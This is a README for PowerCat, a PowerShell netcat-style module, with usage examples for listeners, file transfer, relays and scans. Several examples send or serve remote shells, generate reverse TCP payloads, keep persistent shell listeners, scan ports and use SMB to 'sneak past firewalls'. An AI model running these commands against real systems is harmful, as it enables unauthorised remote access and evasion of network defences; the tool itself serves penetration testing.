PowerCat
========
######A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat.
Inspired by: https://github.com/besimorhino/powercat
Installation
------------
PowerCat is packaged as a PowerShell module.  You must import the module to use its functions.
###
```powershell
    # Import the functions via the psd1 file:
    Import-Module PowerCat.psd1
```
### Functions & Parameters:
```powershell    
    Start-PowerCat # Starts a listener/server.
    
    -Mode           # Defaults to Tcp, can also specify Udp or Smb.
    -Port           # The port to listen on.
	-PipeName       # Name of pipe to listen on.
	
	-SslCn			# Common name for Ssl encrypting Tcp.
    -Relay          # Format: "<Mode>:<Port/PipeName>"
    -Execute        # Execute a console process or powershell.
    -SendFile       # Filepath of file to send.
    -ReceiveFile    # Filepath of file to be written.
    -Disconnect     # Disconnect after connecting.
    -KeepAlive      # Restart after disconnecting.
    -Timeout        # Timeout option. Default: 60 seconds
	
	Connect-PowerCat # Connects a client to a listener/server.
	
    -Mode           # Defaults to Tcp, can also specify Udp or Smb
	-RemoteIp       # IPv4 address of host to connect to.
    -Port           # The port to connect to.
	-PipeName       # Name of pipe to connect to.
	
	-SslCn			# Common name for Ssl encrypting Tcp.
    -Relay          # Format: "<Mode>:<IP>:<Port/PipeName>"
    -Execute        # Execute a console process or powershell.
    -SendFile       # Filepath of file to send.
    -ReceiveFile    # Filepath of file to be written.
    -Disconnect     # Disconnect after connecting.
    -Timeout        # Timeout option. Default: 60 seconds
```
Basic Connections
-----------------------------------
By default, PowerCat uses TCP and reads from / writes to the console.
###
```powershell
    # Basic Listener:
    Start-PowerCat -Port 443
        
    # Basic Client:
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443
```
File Transfer
-------------
PowerCat can be used to transfer files using the -SendFile and -ReceiveFile parameters.
###
```powershell
    # Send File:
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C:\pathto\inputfile
        
    # Receive File:
    Start-PowerCat -Port 443 -ReceiveFile C:\pathto\outputfile
```
Shells
------
PowerCat can be used to send and serve (Power)Shells using the -Execute parameter.
###
```powershell
    # Serve a shell:
    Start-PowerCat -Port 443 -Execute
        
    # Send a Shell:
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -Execute
```
UDP and SMB
-----------
PowerCat supports more than sending data over TCP. 
###
```powershell
    # Send Data Over UDP:
    Start-PowerCat -Mode Udp -Port 8000
        
    # Send Data Over SMB (easily sneak past firewalls):
    Start-PowerCat -Mode Smb -PipeName PowerCat
```
SSL
-----------
PowerCat generates X509 certificates on-the-fly to provide SSL encryption of TCP connections. 
###
```powershell
	# Admin privileges are required to generate the self-signed certificate.
	
    # Serve an SSL-Encrypted (Power)Shell:
    Start-PowerCat -Mode Tcp -Port 80 -SslCn <Certificate Common Name> -Execute
        
    # Connect to an SSL encrypted Ncat listener:
	# Setup *nix with openssl & Ncat:
	# openssl req -X509 -newkey rsa:2048 -subj /CN=PowerCat -days 90 -keyout key.pem -out cert.pem
	# ncat -l -p 80 --ssl --ssl-cert cert.pem --ssl-key key.pem
	
	Connect-PowerCat -Mode Tcp -RemoteIp 10.1.1.1 -Port 80 -SslCn PowerCat 
```
Relays
------
Relays in PowerCat are similar to netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
###
```powershell
    # UDP Listener to TCP Client Relay:
    Start-PowerCat -Mode Udp -Port 8000 -Relay tcp:10.1.1.16:443
        
    # TCP Listener to UDP Client Relay:
    Start-PowerCat -Port 8000 -Relay udp:10.1.1.16:53
        
    # TCP Client to Client Relay
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443
        
    # TCP Listener to SMB Listener Relay
    New-PowerCat -Listener -Port 8000 -Relay smb:PowerCat
```
Generate Payloads
-----------------
Payloads can be generated using the New-PowerCatPayload function. 
###
```powershell
    # Generate a reverse tcp payload that connects back to 10.1.1.15 port 443:
    New-PowerCatPayload -RemoteIp 10.1.1.15 -Port 443 -Execute 
        
    # Generate a tcp payload that listens on port 8000:
    New-PowerCatPayload -Listener -Port 8000 -Execute
```
Misc Usage
----------
PowerCat can also perform port-scans, start persistent listeners, or act as a simple web server.
###
```powershell
    # Basic TCP port scan:
    1..1024 | ForEach-Object { Connect-PowerCat -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
    
    # Basic UDP port scan:
    1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose }
        
    # Persistent listener:
    Start-PowerCat -Port 443 -Execute -KeepAlive
	
	# Simple Web Server:
	Start-PowerCat -Port 80 -SendFile index.html
```
Exiting
----------
In most cases, the ESC key can be used to gracefully exit PowerCat.